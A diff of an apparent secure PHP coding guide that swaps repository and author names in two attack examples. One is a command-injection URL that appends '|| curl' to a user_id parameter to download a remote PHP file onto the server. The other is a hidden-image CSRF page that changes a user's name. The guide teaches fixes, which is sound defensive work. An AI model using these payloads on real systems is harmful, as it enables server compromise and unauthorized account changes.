@@ -255,7 +255,7 @@ if (!file_exists($path)){
 ```
 ####Attack
 - Pass arguments with || or && then system commands
-	- http://localhost/command/upload_picture.php?user_id=1 || curl -K https://raw.githubusercontent.com/vinothzomato/zpwned/master/lfd/download_invoice.php -o test.php
+	- http://localhost/command/upload_picture.php?user_id=1 || curl -K https://raw.githubusercontent.com/0xSpec/Secure-PHP-Programming/master/lfd/download_invoice.php -o test.php
 
 ####How to fix
 - Use escapeshellarg() and escapeshellcmd()
@@ -421,7 +421,7 @@ attacker.html
 <!DOCTYPE html>
 <html>
 <body>
-<img src="http://localhost/csrf/update_user.php?name=YouHaveBeenHackedByVinoth" alt="You Have Been Hacked :(" height="0" width="0"/>
+<img src="http://localhost/csrf/update_user.php?name=YouHaveBeenHackedBySpec" alt="You Have Been Hacked :(" height="0" width="0"/>
 </body>
 </html>
 ```
